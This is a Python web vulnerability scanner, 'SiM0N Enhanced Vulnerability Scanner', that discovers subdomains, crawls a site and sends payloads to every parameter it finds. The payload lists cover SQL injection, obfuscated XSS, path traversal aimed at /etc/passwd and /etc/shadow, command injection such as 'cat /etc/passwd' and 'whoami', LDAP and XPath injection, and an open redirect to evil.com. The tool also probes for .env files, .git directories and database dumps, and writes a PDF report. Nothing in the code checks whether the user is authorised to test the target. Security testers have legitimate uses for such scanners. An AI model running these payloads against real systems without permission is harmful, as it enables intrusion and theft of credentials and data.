import sys
import argparse
import requests
import random
import threading # Not directly used in the final version with ThreadPoolExecutor for all tasks, but kept as it was in original.
import time
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.enums import TA_CENTER
from tqdm import tqdm
from colorama import Fore, Style, init
from bs4 import BeautifulSoup
import dns.resolver
from concurrent.futures import ThreadPoolExecutor, as_completed
import json
import logging

# Initialize colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

COMMON_PARAMS = [
    "id", "page", "search", "q", "query", "item", "cat", "category", "user", "username", "email", "name",
    "file", "path", "url", "redirect", "next", "return", "callback", "jsonp", "action", "cmd", "exec",
    "system", "shell", "command", "debug", "admin", "test", "demo", "example", "sample", "template",
    "theme", "skin", "style", "lang", "language", "locale", "country", "region", "timezone", "format",
    "type", "kind", "sort", "order", "limit", "offset", "start", "end", "from", "to", "min", "max",
    "filter", "include", "exclude", "show", "hide", "view", "display", "output", "print", "export",
    "import", "upload", "download", "source", "src", "target", "dest", "destination", "ref", "referer",
    "token", "key", "secret", "password", "pass", "pwd", "hash", "code", "auth", "login", "logout",
    "register", "signup", "profile", "account", "settings", "config", "option", "param", "parameter",
    "data", "value", "content", "text", "message", "comment", "description", "title", "subject",
    "tag", "tags", "keyword", "keywords", "term", "terms", "phrase", "word", "words", "string"
]

SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1", "' OR 1=1#", "') OR ('1'='1",
    "'; WAITFOR DELAY '0:0:5'--", "' OR sleep(5)--", "'; SELECT pg_sleep(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND '1'='1",
    "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--", "' UNION ALL SELECT NULL,NULL,NULL--",
    "' AND 1=1--", "' AND 1=2--", "' AND 'a'='a", "' AND 'a'='b",
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
    "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "'; SELECT version()--", "' AND 1=CAST((SELECT version()) AS int)--",
    "' AND 1=1 AND '1'='1", "' AND 1=2 AND '1'='1", "' AND (SELECT 1)=1--",
    "' AND 1=1 AND sqlite_version()>'0'--",
    "' || '1'=='1", "' || 1==1//", "'; return true; var fake='",
    "' AND (SELECT SUBSTRING(@@version,1,1))='5'--", "' AND ASCII(SUBSTRING((SELECT @@version),1,1))>52--"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<script>alert('XSS')</script>", "<script>alert(document.domain)</script>",
    "\"><svg/onload=alert(1)>", "<img src=x onerror=alert(1)>", "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>", "<select onfocus=alert(1) autofocus>", "<textarea onfocus=alert(1) autofocus>",
    "javascript:alert(1)", "';alert(1);//", "\";alert(1);//", "'-alert(1)-'", "\"-alert(1)-\"",
    "<ScRiPt>alert(1)</ScRiPt>", "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
    "<svg><script>alert(1)</script></svg>", "<iframe src=javascript:alert(1)>",
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    "\" onmouseover=\"alert(1)", "' onmouseover='alert(1)", "\" onfocus=\"alert(1)\" autofocus=\"",
    "<svg/onload=alert(1)>", "<img/src=x/onerror=alert(1)>", "<iframe/src=javascript:alert(1)>",
    "<script>alert`1`</script>", "<script>(alert)(1)</script>", "<script>window['alert'](1)</script>",
    "<style>@import'javascript:alert(1)';</style>", "<link rel=stylesheet href=javascript:alert(1)>",
    "<svg><foreignObject><iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert(1)\"></iframe></foreignObject></svg>",
    "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
    "{{7*7}}", "${7*7}", "<%=7*7%>", "#{7*7}", "${{7*7}}"
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "../../../../etc/shadow",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002fetc%u002fpasswd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd", "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    "../../../../etc/passwd%00", "../../../../etc/passwd%00.jpg",
    "../../../../etc/hosts", "../../../../proc/version", "../../../../proc/self/environ",
    "../../../windows/system32/drivers/etc/hosts", "../../../boot.ini",
    "../../../../var/log/apache2/access.log", "../../../../var/log/apache/access.log",
    "../../../apache/logs/access.log", "../../../xampp/apache/logs/access.log"
]

COMMAND_INJECTION_PAYLOADS = [
    "; ls", "| ls", "& ls", "&& ls", "|| ls", "`ls`", "$(ls)", "${ls}",
    "; id", "| id", "& id", "&& id", "|| id", "`id`", "$(id)", "${id}",
    "; whoami", "| whoami", "& whoami", "&& whoami", "|| whoami", "`whoami`", "$(whoami)",
    "; cat /etc/passwd", "| cat /etc/passwd", "&& cat /etc/passwd",
    "; ping -c 4 127.0.0.1", "| ping -c 4 127.0.0.1", "&& ping -c 4 127.0.0.1",
    "; sleep 5", "| sleep 5", "&& sleep 5", "|| sleep 5", "`sleep 5`", "$(sleep 5)"
]

LDAP_PAYLOADS = [
    "*", "*)(&", "*))%00", "*()|%26'", "*)(uid=*))(|(uid=*",
    "*)(|(password=*))", "*)(|(objectclass=*))", "*)(|(cn=*))",
    "admin)(&(password=*))", "admin)(&(|(password=*)(password=*))"
]

XPATH_PAYLOADS = [
    "' or '1'='1", "' or 1=1 or ''='", "' or true() or ''='",
    "') or '1'='1", "') or 1=1 or (''='", "') or true() or (''='",
    "x' or 1=1 or 'x'='y", "x') or 1=1 or ('x'='y"
]

SUBDOMAIN_WORDLIST = [
    "www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk", "ns2",
    "cpanel", "whm", "autodiscover", "autoconfig", "m", "imap", "test", "ns", "blog", "pop3",
    "dev", "www2", "admin", "forum", "news", "vpn", "ns3", "mail2", "new", "mysql", "old",
    "www1", "beta", "shop", "shopping", "mobile", "support", "search", "wap", "directory",
    "img", "api", "cdn", "media", "static", "app", "store", "web", "chat", "video", "email",
    "secure", "payment", "payments", "upload", "downloads", "download", "staging", "demo",
    "qa", "testing", "development", "prod", "production", "live", "api2", "v2", "v1", "cdn2"
]

SENSITIVE_FILES = [
    "/robots.txt", "/.env", "/.git/config", "/.htaccess", "/.htpasswd", "/web.config",
    "/config.php", "/config.json", "/config.yml", "/config.xml", "/config.ini",
    "/settings.py", "/admin", "/admin.php", "/admin.html", "/admin/", "/wp-admin",
    "/wp-login.php", "/login", "/login.php", "/signin", "/signin.php", "/register",
    "/register.php", "/backup", "/backup.zip", "/backup.sql", "/backup.tar.gz",
    "/dump.sql", "/db.sql", "/database.sql", "/backup/database.sql", "/phpinfo.php",
    "/info.php", "/test.php", "/debug.php", "/console", "/_profiler", "/phpmyadmin",
    "/dbadmin", "/pma", "/myadmin", "/sqlmanager", "/mysqlmanager", "/phpMyAdmin",
    "/phpmyadmin/", "/server-status", "/server-info", "/.well-known/security.txt",
    "/crossdomain.xml", "/clientaccesspolicy.xml", "/.svn/entries", "/.git/HEAD",
    "/.DS_Store", "/.idea/workspace.xml", "/.project", "/.settings", "/.travis.yml",
    "/package.json", "/composer.json", "/composer.lock", "/yarn.lock", "/Gemfile.lock",
    "/requirements.txt", "/Procfile", "/Dockerfile", "/docker-compose.yml",
    "/.dockerignore", "/.env.example", "/.env.local", "/.env.test", "/.env.production",
    "/.env.development", "/.env.staging", "/.env.dev", "/.env.prod", "/.env.qa"
]

HTTP_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE']

def print_banner():
    main_banner = r"""
░▒▓███████▓▒░ ░▒▓█▓▒░ ░▒▓██████████████▓▒░  ░▒▓████████▓▒░ ░▒▓███████▓▒░  
░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░        ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓██████▓▒░  ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
       ░▒▓█▓▒░ ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
       ░▒▓█▓▒░         ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓███████▓▒░  ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░ ░▒▓████████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░
    """
    subtitle = "SiM0N Enhanced Vulnerability Scanner v2.0"
    print(Fore.GREEN + main_banner)
    print(Fore.RED + subtitle.center(80, "-"))
    print(Fore.YELLOW + "Features: Subdomain Discovery | Advanced Payloads | Parameter Mining | Live Domain Check")
    print("\n")

def discover_subdomains(domain):
    """Discover subdomains using DNS queries and common wordlist"""
    subdomains = set()
    
    print(Fore.CYAN + f"[*] Discovering subdomains for {domain}...")
    
    def check_subdomain(sub):
        try:
            full_domain = f"{sub}.{domain}"
            dns.resolver.resolve(full_domain, 'A')
            return full_domain
        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.resolver.NoNameservers, dns.exception.Timeout):
            return None
        except Exception as e:
            logging.debug(f"Error resolving subdomain {sub}.{domain}: {e}")
            return None
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        future_to_sub = {executor.submit(check_subdomain, sub): sub for sub in SUBDOMAIN_WORDLIST}
        for future in as_completed(future_to_sub):
            result = future.result()
            if result:
                subdomains.add(result)
                print(Fore.GREEN + f"[+] Found subdomain: {result}")
    
    return list(subdomains)

def check_live_domains(domains):
    """Check which domains are live and accessible"""
    live_domains = []
    
    def check_domain(domain):
        try:
            url = f"http://{domain}" if not domain.startswith(('http://', 'https://')) else domain
            
            # Try HTTP first
            resp = requests.get(url, headers={'User-Agent': random.choice(USER_AGENTS)}, 
                              timeout=10, allow_redirects=True)
            if resp.status_code == 200:
                return url
            
            # If HTTP failed or redirected, try HTTPS
            if url.startswith('http://'):
                https_url = url.replace('http://', 'https://')
                resp = requests.get(https_url, headers={'User-Agent': random.choice(USER_AGENTS)}, 
                                  timeout=10, allow_redirects=True)
                if resp.status_code == 200:
                    return https_url
        except requests.exceptions.RequestException as e:
            logging.debug(f"Error checking live domain {domain}: {e}")
            pass # Continue to next domain if request fails
        except Exception as e:
            logging.debug(f"Unexpected error checking live domain {domain}: {e}")
            pass
        return None
    
    print(Fore.CYAN + f"[*] Checking {len(domains)} domains for accessibility...")
    
    with ThreadPoolExecutor(max_workers=20) as executor:
        future_to_domain = {executor.submit(check_domain, domain): domain for domain in domains}
        for future in as_completed(future_to_domain):
            result = future.result()
            if result:
                live_domains.append(result)
                print(Fore.GREEN + f"[+] Live domain: {result}")
    
    return live_domains

def extract_parameters_from_url(url):
    """Extract parameters from URL"""
    parsed = urlparse(url)
    return list(parse_qs(parsed.query).keys())

def find_form_parameters(url):
    """Find form parameters by parsing HTML"""
    try:
        resp = requests.get(url, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=10)
        resp.raise_for_status() # Raise an exception for HTTP errors (4xx or 5xx)
        soup = BeautifulSoup(resp.text, 'html.parser')
        
        params = set()
        
        for form in soup.find_all('form'):
            for input_tag in form.find_all(['input', 'select', 'textarea']):
                name = input_tag.get('name')
                if name:
                    params.add(name)
        
        # Regex to find potential JS parameters (simplified, might need refinement for complex cases)
        js_params = re.findall(r'(?:name|id|data-[\w-]+)\s*=\s*[\'"]?([\w_]+)[\'"]?', resp.text)
        params.update(js_params)
        
        for link in soup.find_all('a', href=True):
            link_params = extract_parameters_from_url(link['href'])
            params.update(link_params)
        
        return list(params)
    except requests.exceptions.RequestException as e:
        logging.debug(f"Error fetching form parameters from {url}: {e}")
        return []
    except Exception as e:
        logging.debug(f"Unexpected error finding form parameters from {url}: {e}")
        return []

def crawl_urls(base_url, max_depth):
    """Enhanced URL crawler with parameter extraction"""
    visited = set()
    to_visit = [(base_url, 0)]
    found_urls = set([base_url])
    all_parameters = set()
    
    while to_visit:
        url, depth = to_visit.pop(0)
        if depth >= max_depth or url in visited:
            continue
        visited.add(url)
        
        try:
            url_params = extract_parameters_from_url(url)
            all_parameters.update(url_params)
            
            form_params = find_form_parameters(url)
            all_parameters.update(form_params)
            
            # Fetch content for new links
            resp = requests.get(url, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=10)
            resp.raise_for_status() # Raise an exception for HTTP errors
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            for link in soup.find_all('a', href=True):
                abs_url = urljoin(url, link['href'])
                parsed_abs_url = urlparse(abs_url)
                parsed_base_url = urlparse(base_url)

                # Ensure we stay within the same domain and not already visited
                if parsed_abs_url.netloc == parsed_base_url.netloc and abs_url not in found_urls:
                    # Normalize URL to avoid duplicates with different query orders etc.
                    normalized_url = urlunparse(parsed_abs_url._replace(query=None, fragment=None)) # Remove query and fragment for comparison
                    if normalized_url not in found_urls:
                        found_urls.add(normalized_url)
                        to_visit.append((abs_url, depth + 1))
        except requests.exceptions.RequestException as e:
            logging.debug(f"Error crawling {url}: {e}")
            continue
        except Exception as e:
            logging.debug(f"Unexpected error during crawling {url}: {e}")
            continue
    
    return list(found_urls), list(all_parameters)

class EnhancedVulnerabilityScanner:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.vulnerabilities = []
        self.parameters = set()

    def scan(self, discovered_params=None):
        """Enhanced scanning with discovered parameters"""
        if discovered_params:
            self.parameters.update(discovered_params)
        self.parameters.update(COMMON_PARAMS)
        
        print(Fore.CYAN + f"[*] Scanning {self.target_url} with {len(self.parameters)} parameters...")
        
        self.check_sql_injection()
        self.check_xss()
        self.check_path_traversal()
        self.check_command_injection()
        self.check_ldap_injection()
        self.check_xpath_injection()
        self.check_clickjacking()
        self.check_open_redirect()
        self.check_sensitive_files()
        self.check_http_methods()
        self.check_security_headers()
        
        return self.categorize_vulnerabilities()

    def categorize_vulnerabilities(self):
        severity_map = {
            'SQL Injection': 'Critical',
            'Command Injection': 'Critical',
            'XSS': 'High',
            'Path Traversal': 'High',
            'LDAP Injection': 'High',
            'XPath Injection': 'High',
            'Open Redirect': 'Medium',
            'Sensitive File/Directory': 'Medium',
            'HTTP Methods': 'Medium',
            'Security Headers': 'Low',
            'Clickjacking': 'Low'
        }
        categorized = {'Critical': [], 'High': [], 'Medium': [], 'Low': []}
        for vuln in self.vulnerabilities:
            severity = severity_map.get(vuln['type'], 'Low')
            categorized[severity].append(vuln)
        return categorized

    def send_request(self, url, params=None, method='GET', data=None):
        headers = {'User-Agent': random.choice(USER_AGENTS)}
        try:
            if method.upper() == 'POST':
                resp = requests.post(url, data=data, headers=headers, timeout=10, allow_redirects=True)
            else: # GET or other methods with params in URL
                # For GET, params should be in the URL query string
                if params:
                    parsed_url = urlparse(url)
                    query_params = parse_qs(parsed_url.query)
                    query_params.update(params) # Add/overwrite with new params
                    new_query = '&'.join([f"{k}={v[0] if isinstance(v, list) else v}" for k, v in query_params.items()])
                    url = urlunparse(parsed_url._replace(query=new_query))
                resp = requests.request(method, url, headers=headers, timeout=10, allow_redirects=True)
            resp.raise_for_status() # Raise HTTPError for bad responses (4xx or 5xx)
            return resp
        except requests.exceptions.RequestException as e:
            logging.debug(f"Request failed for {url} ({method}): {e}")
            return None
        except Exception as e:
            logging.debug(f"Unexpected error in send_request to {url} ({method}): {e}")
            return None

    def check_sql_injection(self):
        print(Fore.YELLOW + "[*] Testing SQL Injection...")
        for param in self.parameters:
            for payload in SQLI_PAYLOADS:
                params = {param: payload}
                resp = self.send_request(self.target_url, params)
                if resp:
                    error_patterns = [
                        "syntax error", "mysql", "you have an error in your sql syntax",
                        "postgresql", "ora-", "microsoft ole db", "sqlite", "warning: mysql",
                        "error in your sql", "mariadb", "driver", "jdbc", "database error"
                    ]
                    if any(pattern in resp.text.lower() for pattern in error_patterns):
                        print(Fore.RED + f"[!] SQL Injection detected at {resp.url} with param '{param}' and payload '{payload}'")
                        self.vulnerabilities.append({
                            'type': 'SQL Injection',
                            'url': resp.url,
                            'parameter': param,
                            'payload': payload,
                            'description': f"SQL Injection vulnerability found with parameter '{param}'"
                        })

    def check_xss(self):
        print(Fore.YELLOW + "[*] Testing XSS vulnerabilities...")
        for param in self.parameters:
            for payload in XSS_PAYLOADS:
                params = {param: payload}
                resp = self.send_request(self.target_url, params)
                # Check if the payload reflects in the response body, often an indicator of XSS.
                # This is a basic check; real XSS detection is more complex.
                if resp and payload in resp.text:
                    print(Fore.RED + f"[!] XSS detected at {resp.url} with param '{param}' and payload '{payload}'")
                    self.vulnerabilities.append({
                        'type': 'XSS',
                        'url': resp.url,
                        'parameter': param,
                        'payload': payload,
                        'description': f"XSS vulnerability found with parameter '{param}'"
                    })

    def check_path_traversal(self):
        print(Fore.YELLOW + "[*] Testing Path Traversal...")
        for param in self.parameters:
            for payload in PATH_TRAVERSAL_PAYLOADS:
                params = {param: payload}
                resp = self.send_request(self.target_url, params)
                if resp:
                    traversal_patterns = [
                        "root:x", "[extensions]", "boot loader", "system volume information",
                        "program files", "windows", "config.sys", "autoexec.bat",
                        "daemon:x" # Added for Linux /etc/passwd output
                    ]
                    if any(pattern in resp.text.lower() for pattern in traversal_patterns):
                        print(Fore.RED + f"[!] Path Traversal detected at {resp.url} with param '{param}' and payload '{payload}'")
                        self.vulnerabilities.append({
                            'type': 'Path Traversal',
                            'url': resp.url,
                            'parameter': param,
                            'payload': payload,
                            'description': f"Path Traversal vulnerability found with parameter '{param}'"
                        })

    def check_command_injection(self):
        print(Fore.YELLOW + "[*] Testing Command Injection...")
        for param in self.parameters:
            for payload in COMMAND_INJECTION_PAYLOADS:
                params = {param: payload}
                resp = self.send_request(self.target_url, params)
                if resp:
                    command_patterns = [
                        "uid=", "gid=", "groups=", "total ", "directory of", "volume serial number",
                        "bin", "sbin", "usr" # Common in 'ls' or 'id' output
                    ]
                    if any(pattern in resp.text.lower() for pattern in command_patterns):
                        print(Fore.RED + f"[!] Command Injection detected at {resp.url} with param '{param}' and payload '{payload}'")
                        self.vulnerabilities.append({
                            'type': 'Command Injection',
                            'url': resp.url,
                            'parameter': param,
                            'payload': payload,
                            'description': f"Command Injection vulnerability found with parameter '{param}'"
                        })

    def check_ldap_injection(self):
        print(Fore.YELLOW + "[*] Testing LDAP Injection...")
        for param in self.parameters:
            for payload in LDAP_PAYLOADS:
                params = {param: payload}
                resp = self.send_request(self.target_url, params)
                if resp:
                    ldap_patterns = [
                        "javax.naming.directory", "ldap", "cn=", "ou=", "dc=", "objectclass",
                        "ldap_search", "ldap_bind" # common error messages
                    ]
                    if any(pattern in resp.text.lower() for pattern in ldap_patterns):
                        print(Fore.RED + f"[!] LDAP Injection detected at {resp.url} with param '{param}' and payload '{payload}'")
                        self.vulnerabilities.append({
                            'type': 'LDAP Injection',
                            'url': resp.url,
                            'parameter': param,
                            'payload': payload,
                            'description': f"LDAP Injection vulnerability found with parameter '{param}'"
                        })

    def check_xpath_injection(self):
        print(Fore.YELLOW + "[*] Testing XPath Injection...")
        for param in self.parameters:
            for payload in XPATH_PAYLOADS:
                params = {param: payload}
                resp = self.send_request(self.target_url, params)
                if resp:
                    xpath_patterns = [
                        "xpath", "xquery", "xmlexception", "xpath syntax error",
                        "failed to compile xpath expression", "invalid xpath" # common error messages
                    ]
                    if any(pattern in resp.text.lower() for pattern in xpath_patterns):
                        print(Fore.RED + f"[!] XPath Injection detected at {resp.url} with param '{param}' and payload '{payload}'")
                        self.vulnerabilities.append({
                            'type': 'XPath Injection',
                            'url': resp.url,
                            'parameter': param,
                            'payload': payload,
                            'description': f"XPath Injection vulnerability found with parameter '{param}'"
                        })

    def check_clickjacking(self):
        print(Fore.YELLOW + "[*] Testing Clickjacking...")
        resp = self.send_request(self.target_url)
        if resp and 'x-frame-options' not in resp.headers and 'content-security-policy' not in resp.headers:
            print(Fore.YELLOW + f"[!] Clickjacking risk at {self.target_url}: No X-Frame-Options or CSP frame policy set")
            self.vulnerabilities.append({
                'type': 'Clickjacking',
                'url': self.target_url,
                'description': 'No X-Frame-Options or CSP frame policy set'
            })

    def check_open_redirect(self):
        print(Fore.YELLOW + "[*] Testing Open Redirect...")
        redirect_payloads = ["//evil.com", "http://evil.com", "https://evil.com"] # Removed javascript:alert(1) as it's not a true redirect but an XSS payload
        for param in self.parameters:
            for payload in redirect_payloads:
                params = {param: payload}
                resp = self.send_request(self.target_url, params)
                if resp and (payload in resp.url or urlparse(resp.url).netloc == urlparse(payload).netloc):
                    print(Fore.YELLOW + f"[!] Open Redirect detected at {resp.url} with param '{param}' (Payload: {payload})")
                    self.vulnerabilities.append({
                        'type': 'Open Redirect',
                        'url': resp.url,
                        'parameter': param,
                        'payload': payload,
                        'description': f"Open Redirect vulnerability found with parameter '{param}'"
                    })

    def check_sensitive_files(self):
        print(Fore.YELLOW + "[*] Testing Sensitive Files...")
        for path in SENSITIVE_FILES:
            url = urljoin(self.target_url, path)
            resp = self.send_request(url)
            if resp and resp.status_code == 200 and len(resp.text) > 10: # Check if content exists
                print(Fore.YELLOW + f"[!] Sensitive file or directory found: {url}")
                self.vulnerabilities.append({
                    'type': 'Sensitive File/Directory',
                    'url': url,
                    'description': f"Accessible sensitive file or directory: {path}"
                })

    def check_http_methods(self):
        print(Fore.YELLOW + "[*] Testing HTTP Methods...")
        for method in HTTP_METHODS:
            try:
                resp = requests.request(method, self.target_url, headers={'User-Agent': random.choice(USER_AGENTS)}, timeout=10)
                # If status code is not a typical error for disallowed methods (405, 501), it might be allowed.
                if resp.status_code not in [400, 401, 403, 404, 405, 501]:
                    print(Fore.YELLOW + f"[!] Potentially risky HTTP method allowed: {method} (Status: {resp.status_code})")
                    self.vulnerabilities.append({
                        'type': 'HTTP Methods',
                        'url': self.target_url,
                        'description': f"Potentially risky HTTP method allowed: {method} (Status: {resp.status_code})"
                    })
            except requests.exceptions.RequestException as e:
                logging.debug(f"Error testing HTTP method {method} on {self.target_url}: {e}")
                pass # Continue to next method

    def check_security_headers(self):
        print(Fore.YELLOW + "[*] Checking Security Headers...")
        resp = self.send_request(self.target_url)
        if resp:
            missing_headers = []
            security_headers = [
                'X-XSS-Protection', 'X-Content-Type-Options', 'X-Frame-Options',
                'Content-Security-Policy', 'Strict-Transport-Security', 'Referrer-Policy'
            ]
            
            for header in security_headers:
                if header.lower() not in [h.lower() for h in resp.headers.keys()]: # Case-insensitive check
                    missing_headers.append(header)
            
            if missing_headers:
                print(Fore.YELLOW + f"[!] Missing security headers: {', '.join(missing_headers)}")
                self.vulnerabilities.append({
                    'type': 'Security Headers',
                    'url': self.target_url,
                    'description': f"Missing security headers: {', '.join(missing_headers)}"
                })

def generate_report(filename, findings):
    doc = SimpleDocTemplate(filename, pagesize=letter)
    styles = getSampleStyleSheet()
    styles.add(ParagraphStyle(name='SeverityHeading', parent=styles['Heading2'], alignment=TA_CENTER))
    elements = []
    elements.append(Paragraph("Bug Report By SiM0N", styles['Title']))
    elements.append(Spacer(1, 12))
    
    # Sort findings by severity (Critical, High, Medium, Low)
    severity_order = ['Critical', 'High', 'Medium', 'Low']
    
    for severity in severity_order:
        if findings[severity]:
            elements.append(Paragraph(f"{severity} Risk Findings", styles['SeverityHeading']))
            elements.append(Spacer(1, 8))
            for vuln in findings[severity]:
                elements.append(Paragraph(f"<b>Type:</b> {vuln['type']}", styles['h3'])) # Use h3 for consistent heading size
                elements.append(Paragraph(f"<b>URL:</b> {vuln['url']}", styles['Normal'])) # Use Normal for body text
                if 'parameter' in vuln:
                    elements.append(Paragraph(f"<b>Parameter:</b> {vuln['parameter']}", styles['Normal']))
                if 'payload' in vuln:
                    elements.append(Paragraph(f"<b>Payload:</b> {vuln['payload']}", styles['Normal']))
                elements.append(Paragraph(f"<b>Description:</b> {vuln['description']}", styles['Normal']))
                elements.append(Spacer(1, 8))
            elements.append(Spacer(1, 16)) # Add more space between severity sections
    
    if not any(findings.values()):
        elements.append(Paragraph("No vulnerabilities found.", styles['Normal']))
    
    doc.build(elements)

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="SiM0N Enhanced vuln-scanner: Advanced web vulnerability scanner with PDF reporting.")
    parser.add_argument('-d', '--domain', required=True, help='Target website URL (e.g., http://example.com)')
    parser.add_argument('-l', '--level', type=int, default=1, help='Crawl depth level (default: 1)')
    parser.add_argument('-o', '--output', default="vulnerability_report.pdf", help='Output PDF file name')
    parser.add_argument('--subdomains', action='store_true', help='Enable subdomain discovery')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads for scanning (default: 10)')
    args = parser.parse_args()
    target = args.domain
    level = args.level
    output_file = args.output
    enable_subdomains = args.subdomains
    threads = args.threads

    # Discover subdomains if enabled
    domains_to_scan = [target]
    if enable_subdomains:
        parsed_target = urlparse(target)
        base_domain = parsed_target.netloc if parsed_target.netloc else target.split('/')[0]
        
        logging.info(f"Starting subdomain discovery for: {base_domain}")
        subdomains = discover_subdomains(base_domain)
        
        if subdomains:
            logging.info(f"Checking live status for {len(subdomains)} discovered subdomains.")
            live_subdomains = check_live_domains(subdomains)
            domains_to_scan.extend(live_subdomains)
        else:
            logging.info("No subdomains discovered.")

    all_findings = {'Critical': [], 'High': [], 'Medium': [], 'Low': []}
    
    for domain_target in domains_to_scan: # Renamed 'domain' to 'domain_target' to avoid confusion with `domain` variable in check_domain.
        print(Fore.CYAN + f"\n[*] Scanning domain: {domain_target}")
        
        # Crawl URLs and extract parameters
        print(Fore.CYAN + f"[*] Crawling '{domain_target}' up to depth {level} ...")
        urls, params = crawl_urls(domain_target, level)
        print(Fore.CYAN + f"[*] Found {len(urls)} URLs and {len(params)} parameters to scan for {domain_target}.")
        
        # Function to be executed by each thread
        def perform_scan_for_url(url, discovered_params):
            scanner = EnhancedVulnerabilityScanner(url)
            return scanner.scan(discovered_params)

        # Scan each URL with discovered parameters using ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=threads) as executor:
            # Pass the shared `params` set to each scanner instance
            future_to_url = {executor.submit(perform_scan_for_url, url, params): url for url in urls}
            
            for future in tqdm(as_completed(future_to_url), total=len(urls), desc=f"Scanning URLs for {domain_target}"):
                url = future_to_url[future]
                try:
                    findings = future.result()
                    for severity in findings:
                        all_findings[severity].extend(findings[severity])
                except Exception as e:
                    logging.error(f"Error scanning {url}: {str(e)}")
                    print(Fore.RED + f"[-] Error scanning {url}: {str(e)}")

    # Generate the final report
    print(Fore.CYAN + f"\n[*] Generating report: {output_file}")
    generate_report(output_file, all_findings)
    print(Fore.GREEN + "[+] Scan completed. Report saved.")
    logging.info("Scan completed. Report saved.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Scan interrupted by user")
        logging.info("Scan interrupted by user.")
        sys.exit(1)
    except Exception as e:
        print(Fore.RED + f"\n[!] An unhandled error occurred: {str(e)}")
        logging.critical(f"An unhandled error occurred: {str(e)}", exc_info=True)
        sys.exit(1)
